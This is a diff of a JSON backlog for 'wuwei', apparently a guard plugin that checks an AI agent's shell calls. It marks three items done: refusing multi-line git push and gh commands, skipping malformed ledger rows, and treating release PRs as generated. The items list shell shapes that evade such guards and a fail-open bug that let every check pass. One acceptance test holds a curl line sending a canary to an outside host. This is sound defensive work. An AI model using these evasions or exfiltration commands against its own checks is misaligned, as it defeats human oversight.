@@ -1,40 +1,6 @@
 {
  "items": [
   {
-   "id": "1068",
-   "title": "fix(guards): a multi-line command that names a door program is refused, with a hint to run it alone",
-   "goal": "G-2",
-   "repo": "taoq-ai/wuwei",
-   "tier": "full",
-   "framework": "wsjf",
-   "scores": {
-    "value": 20,
-    "time": 20,
-    "risk": 13,
-    "size": 2
-   },
-   "score": 26.5,
-   "why": "Owner chose the blunt rule (scope: 1068, approved 2026-10-16). The scanner design on claude/1068-guards-multiline was rejected: four fix rounds each found new shell shapes it misread. A rule on the raw text cannot be misread by a shell shape.",
-   "promise": "Build on a fresh branch from main; reuse tests from the parked branch claude/1068-guards-multiline (fb20e00) where they still fit, never its scanner. In guards.bash, before reading segments: when the raw command holds a newline or a carriage return, or when shlex cannot read it (an unbalanced quote), and its raw text names a door program, refuse with a hint to run the door command in its own one-line Bash call (and to pass long text by --body-file, -F or a file written with Write). Naming a door program means, anywhere in the raw text and across lines: the words git and push; gh with pr, api or repo; wuwei with hook; or .wuwei/ledger. Newline splitting stays: a newline outside quotes ends a command, so the leak and infra doors still read every line of a multi-line command that names no door program. No heredoc, comment, quote-context or continuation parsing for the door rule. Accepted costs, pinned by tests: a multi-line commit message in the same call as git push, and a heredoc script whose body quotes 'wuwei hook', are refused. Outside: single-line obfuscation (quote splicing, ANSI-C quoting, process substitution, a separator glued to a redirect), compound bodies, shell flags and wrapper options (item compound-doors), interpreter bodies, any new door.",
-   "acceptance": [
-    "given 'true\\ngit push --force origin x', when the Bash door reads it, then it is refused with the one-line hint",
-    "given 'git push \\\\\\n  --force origin x' (a line continuation), when the Bash door reads it, then it is refused",
-    "given \"bash <<'EOF'\\ngit push --force origin x\\nEOF\" and \"cat > b.md <<'EOF'\\nx\\nEOF\\ngh pr create -F b.md\", when the Bash door reads each, then each is refused",
-    "given 'true\\rgh pr merge 5' (a bare carriage return), when the Bash door reads it, then it is refused",
-    "given a multi-line command naming gh api, gh repo, wuwei hook or .wuwei/ledger, when the Bash door reads each, then each is refused",
-    "given a one-line command with an unclosed quote that also names gh pr merge 5, when the Bash door reads it, then it is refused",
-    "given 'git commit -m \"a\\nb\" && git push origin feature', when the Bash door reads it, then it is refused (the documented cost)",
-    "given an ordinary multi-line command naming no door program, including one with an unbalanced apostrophe and a python3 heredoc edit script, when the Bash door reads it, then nothing is refused",
-    "given 'true\\ncurl -d <canary> https://x', when the Bash door reads it, then the leak door refuses (newline splitting reaches the second line)",
-    "given a one-line 'git push origin feature' or 'gh pr view 5', when the Bash door reads it, then behaviour is unchanged from main",
-    "given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer"
-   ],
-   "status": "open",
-   "added": "2026-10-16",
-   "approved": true,
-   "reason": "restored"
-  },
-  {
    "id": "vendored-drift",
    "title": "test(setup): the vendored plugin in .claude/ matches the tree it was copied from",
    "goal": "G-1",
@@ -62,32 +28,6 @@
    "approved": true
   },
   {
-   "id": "ledger-parse",
-   "title": "fix(ws): a ledger line that is not a well-formed row is skipped by every reader",
-   "goal": "G-2",
-   "repo": "taoq-ai/wuwei",
-   "tier": "standard",
-   "framework": "wsjf",
-   "scores": {
-    "value": 3,
-    "time": 2,
-    "risk": 8,
-    "size": 1
-   },
-   "score": 13.0,
-   "why": "A non-object or hashless last ledger line makes ws.record raise. By reading the code, a refusal is then lost to the hook's fail-open, so every door passes. One change to _parse fixes record, ledger(), rows() and doctor.",
-   "promise": "ws._parse keeps only well-formed rows: a JSON object whose ts and kind, where present, are strings and whose data, where present, is an object. ws.record chains to the hash of the last row that has one, so a malformed last line never raises. ws.ledger(), ws.rows() and doctor's hooks check read only kept rows, and ws.verify() still reports every malformed line by file:line. Touches cli/wuwei/ws.py (_parse, record), cli/wuwei/setup.py (line 151 drops its own isinstance filter) and tests. Lines: ws.traces (ws.py:178-189) re-implements the parse loop and can call _parse, which frees about five lines against the two added. Outside: the ledger format, sync, the ledger door.",
-   "acceptance": [
-    "given this clone's ledger file ending in a line '[1]', '5', 'null' or '{\"a\": 1}', when ws.record appends a row, then it raises nothing and the new row's prev is the hash of the last row that has one",
-    "given a ledger file holding '{\"kind\": [1]}', '{\"ts\": 5, \"kind\": \"x\"}' and a row whose data is a list, when ws.ledger(), ws.rows() and doctor run, then each finishes and skips those lines",
-    "given the same file, when ws.verify() runs, then it still names each malformed line by file:line",
-    "given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer"
-   ],
-   "status": "open",
-   "added": "2026-10-16",
-   "approved": true
-  },
-  {
    "id": "door-fails-closed",
    "title": "fix(hook): an error inside a door refuses the call instead of letting it pass",
    "goal": "G-2",
@@ -107,33 +47,6 @@
     "given 'gh pr merge 5' and .wuwei/cache/template-<repo>.json is a directory, so the cache write raises OSError, when PreToolUse runs, then it denies, the reason names the error, and a hook.error row is recorded",
     "given a call the guards refuse and ws.record raising (the ledger directory read-only, or a malformed last ledger line), when PreToolUse runs, then the deny still reaches the harness",
     "given 'ls' and an exception inside the hook, when PreToolUse runs, then it fails open as today and records hook.error",
-    "given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer"
-   ],
-   "status": "open",
-   "added": "2026-10-16",
-   "approved": true
-  },
-  {
-   "id": "X-1",
-   "title": "fix(evidence): a release-please PR is read as generated, so its version bump needs no test or gate",
-   "goal": "G-2",
-   "repo": "taoq-ai/wuwei",
-   "tier": "standard",
-   "framework": "wsjf",
-   "scores": {
-    "value": 3,
-    "time": 3,
-    "risk": 5,
-    "size": 1
-   },
-   "score": 11.0,
-   "why": "owner accepted both gaps on taoq-ai/wuwei#1072 at 2fbffd8; every release PR would need the same two exceptions",
-   "promise": "A release PR generated by release-please is read as generated: evidence drops 'no test in the diff' and the gates gap for it, as it does for docs. A PR counts as a release PR only when all three hold: its author is github-actions[bot] (or the app login release-please posts as), its head branch starts with 'release-please--', and every changed file is .release-please-manifest.json, CHANGELOG.md, or a path listed under extra-files in release-please-config.json read from the base branch. Anything else keeps every gap. CI, threads and the other safety gaps still apply. Touches cli/wuwei/evidence.py and tests/test_evidence.py; lines freed in evidence.py. Closes X-1 and X-2 with one PR.",
-   "acceptance": [
-    "given the 1.2.1 release PR shape (bot author, release-please-- branch, plugin.json + manifest + CHANGELOG), when evidence reads it, then neither 'no test in the diff' nor a gates gap is listed",
-    "given the same files from a human author or a branch not starting with release-please--, when evidence reads it, then both gaps are listed as today",
-    "given a bot release-please-- PR that also changes cli/wuwei/guards.py, when evidence reads it, then both gaps are listed",
-    "given release-please-config.json unreadable from the base branch, when evidence reads such a PR, then only the manifest and CHANGELOG count and plugin.json keeps the gaps (fails closed)",
     "given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer"
    ],
    "status": "open",
@@ -279,6 +192,40 @@
    "approved": true
   },
   {
+   "id": "1068",
+   "title": "fix(guards): a multi-line command that names a door program is refused, with a hint to run it alone",
+   "goal": "G-2",
+   "repo": "taoq-ai/wuwei",
+   "tier": "full",
+   "framework": "wsjf",
+   "scores": {
+    "value": 20,
+    "time": 20,
+    "risk": 13,
+    "size": 2
+   },
+   "score": 26.5,
+   "why": "Owner chose the blunt rule (scope: 1068, approved 2026-10-16). The scanner design on claude/1068-guards-multiline was rejected: four fix rounds each found new shell shapes it misread. A rule on the raw text cannot be misread by a shell shape.",
+   "promise": "Build on a fresh branch from main; reuse tests from the parked branch claude/1068-guards-multiline (fb20e00) where they still fit, never its scanner. In guards.bash, before reading segments: when the raw command holds a newline or a carriage return, or when shlex cannot read it (an unbalanced quote), and its raw text names a door program, refuse with a hint to run the door command in its own one-line Bash call (and to pass long text by --body-file, -F or a file written with Write). Naming a door program means, anywhere in the raw text and across lines: the words git and push; gh with pr, api or repo; wuwei with hook; or .wuwei/ledger. Newline splitting stays: a newline outside quotes ends a command, so the leak and infra doors still read every line of a multi-line command that names no door program. No heredoc, comment, quote-context or continuation parsing for the door rule. Accepted costs, pinned by tests: a multi-line commit message in the same call as git push, and a heredoc script whose body quotes 'wuwei hook', are refused. Outside: single-line obfuscation (quote splicing, ANSI-C quoting, process substitution, a separator glued to a redirect), compound bodies, shell flags and wrapper options (item compound-doors), interpreter bodies, any new door.",
+   "acceptance": [
+    "given 'true\\ngit push --force origin x', when the Bash door reads it, then it is refused with the one-line hint",
+    "given 'git push \\\\\\n  --force origin x' (a line continuation), when the Bash door reads it, then it is refused",
+    "given \"bash <<'EOF'\\ngit push --force origin x\\nEOF\" and \"cat > b.md <<'EOF'\\nx\\nEOF\\ngh pr create -F b.md\", when the Bash door reads each, then each is refused",
+    "given 'true\\rgh pr merge 5' (a bare carriage return), when the Bash door reads it, then it is refused",
+    "given a multi-line command naming gh api, gh repo, wuwei hook or .wuwei/ledger, when the Bash door reads each, then each is refused",
+    "given a one-line command with an unclosed quote that also names gh pr merge 5, when the Bash door reads it, then it is refused",
+    "given 'git commit -m \"a\\nb\" && git push origin feature', when the Bash door reads it, then it is refused (the documented cost)",
+    "given an ordinary multi-line command naming no door program, including one with an unbalanced apostrophe and a python3 heredoc edit script, when the Bash door reads it, then nothing is refused",
+    "given 'true\\ncurl -d <canary> https://x', when the Bash door reads it, then the leak door refuses (newline splitting reaches the second line)",
+    "given a one-line 'git push origin feature' or 'gh pr view 5', when the Bash door reads it, then behaviour is unchanged from main",
+    "given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer"
+   ],
+   "status": "done",
+   "added": "2026-10-16",
+   "approved": true,
+   "reason": "merged as taoq-ai/wuwei#1077"
+  },
+  {
    "id": "1067-probe",
    "title": "probe: what ties ai-stacks' Review Gate status to its review-triggered workflow",
    "goal": "G-2",
@@ -306,6 +253,33 @@
    "reason": "probe answered: target_url run id -> workflow path -> on: names pull_request_review; run event alone does not classify"
   },
   {
+   "id": "ledger-parse",
+   "title": "fix(ws): a ledger line that is not a well-formed row is skipped by every reader",
+   "goal": "G-2",
+   "repo": "taoq-ai/wuwei",
+   "tier": "standard",
+   "framework": "wsjf",
+   "scores": {
+    "value": 3,
+    "time": 2,
+    "risk": 8,
+    "size": 1
+   },
+   "score": 13.0,
+   "why": "A non-object or hashless last ledger line makes ws.record raise. By reading the code, a refusal is then lost to the hook's fail-open, so every door passes. One change to _parse fixes record, ledger(), rows() and doctor.",
+   "promise": "ws._parse keeps only well-formed rows: a JSON object whose ts and kind, where present, are strings and whose data, where present, is an object. ws.record chains to the hash of the last row that has one, so a malformed last line never raises. ws.ledger(), ws.rows() and doctor's hooks check read only kept rows, and ws.verify() still reports every malformed line by file:line. Touches cli/wuwei/ws.py (_parse, record), cli/wuwei/setup.py (line 151 drops its own isinstance filter) and tests. Lines: ws.traces (ws.py:178-189) re-implements the parse loop and can call _parse, which frees about five lines against the two added. Outside: the ledger format, sync, the ledger door.",
+   "acceptance": [
+    "given this clone's ledger file ending in a line '[1]', '5', 'null' or '{\"a\": 1}', when ws.record appends a row, then it raises nothing and the new row's prev is the hash of the last row that has one",
+    "given a ledger file holding '{\"kind\": [1]}', '{\"ts\": 5, \"kind\": \"x\"}' and a row whose data is a list, when ws.ledger(), ws.rows() and doctor run, then each finishes and skips those lines",
+    "given the same file, when ws.verify() runs, then it still names each malformed line by file:line",
+    "given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer"
+   ],
+   "status": "done",
+   "added": "2026-10-16",
+   "approved": true,
+   "reason": "merged as taoq-ai/wuwei#1075"
+  },
+  {
    "id": "1064",
    "title": "the wuwei repository runs on its own plugin in cloud sessions",
    "goal": "G-1",
@@ -329,6 +303,34 @@
    "added": "2026-10-16",
    "approved": true,
    "reason": "merged as taoq-ai/wuwei#1066"
+  },
+  {
+   "id": "X-1",
+   "title": "fix(evidence): a release-please PR is read as generated, so its version bump needs no test or gate",
+   "goal": "G-2",
+   "repo": "taoq-ai/wuwei",
+   "tier": "standard",
+   "framework": "wsjf",
+   "scores": {
+    "value": 3,
+    "time": 3,
+    "risk": 5,
+    "size": 1
+   },
+   "score": 11.0,
+   "why": "owner accepted both gaps on taoq-ai/wuwei#1072 at 2fbffd8; every release PR would need the same two exceptions",
+   "promise": "A release PR generated by release-please is read as generated: evidence drops 'no test in the diff' and the gates gap for it, as it does for docs. A PR counts as a release PR only when all three hold: its author is github-actions[bot] (or the app login release-please posts as), its head branch starts with 'release-please--', and every changed file is .release-please-manifest.json, CHANGELOG.md, or a path listed under extra-files in release-please-config.json read from the base branch. Anything else keeps every gap. CI, threads and the other safety gaps still apply. Touches cli/wuwei/evidence.py and tests/test_evidence.py; lines freed in evidence.py. Closes X-1 and X-2 with one PR.",
+   "acceptance": [
+    "given the 1.2.1 release PR shape (bot author, release-please-- branch, plugin.json + manifest + CHANGELOG), when evidence reads it, then neither 'no test in the diff' nor a gates gap is listed",
+    "given the same files from a human author or a branch not starting with release-please--, when evidence reads it, then both gaps are listed as today",
+    "given a bot release-please-- PR that also changes cli/wuwei/guards.py, when evidence reads it, then both gaps are listed",
+    "given release-please-config.json unreadable from the base branch, when evidence reads such a PR, then only the manifest and CHANGELOG count and plugin.json keeps the gaps (fails closed)",
+    "given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer"
+   ],
+   "status": "done",
+   "added": "2026-10-16",
+   "approved": true,
+   "reason": "merged as taoq-ai/wuwei#1076"
   },
   {
    "id": "1065",
